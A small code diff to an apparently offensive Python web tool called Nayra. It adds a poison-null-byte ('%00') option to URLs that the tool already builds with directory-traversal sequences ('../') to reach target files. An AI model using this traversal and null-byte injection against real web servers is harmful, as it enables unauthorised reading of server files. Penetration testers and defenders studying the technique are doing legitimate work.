@@ -125,7 +125,10 @@ class Nayra(object):
             shell = '../' * int(self.argvs.path)
         shell = (shell + rFile).replace('//', '/')
         shell = self.argvs.url + shell
-        
+
+        if bool(self.argvs.null) == True:
+            shell = shell + '%00'
+            
         return shell, payload
 
     def GetNewURL(self):
@@ -211,6 +214,7 @@ class Nayra(object):
         print '   -c, --cookies            Session cookies'
         print '   -x, --proxy              Using a proxy -> [http://user:passwd@host:port]'
         print '   -p, --path               When it is necessary to make a directory traversal'
+        print '   -b, --null-byte          Add Poison Null Byte (%00)'
         print ''
         print 'Other Parameters:'
         print ''
